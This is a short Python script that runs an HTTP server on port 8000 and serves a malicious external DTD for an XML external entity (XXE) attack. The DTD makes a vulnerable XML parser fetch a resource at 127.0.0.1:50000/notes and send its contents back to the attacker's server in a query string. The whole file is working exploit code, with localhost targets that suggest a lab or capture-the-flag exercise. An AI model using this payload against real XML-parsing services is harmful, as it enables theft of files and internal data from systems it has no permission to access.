import http.server
import socketserver
from http import HTTPStatus

attack = b"""
<!ENTITY % file SYSTEM "http://127.0.0.1:50000/notes">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1:8000/?a=%file;'>">
%eval;
%exfiltrate;
"""


class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(HTTPStatus.OK)
        self.send_header("Content-type", "application/xml-dtd")
        self.end_headers()
        self.wfile.write(attack)


httpd = socketserver.TCPServer(('', 8000), Handler)
httpd.serve_forever()
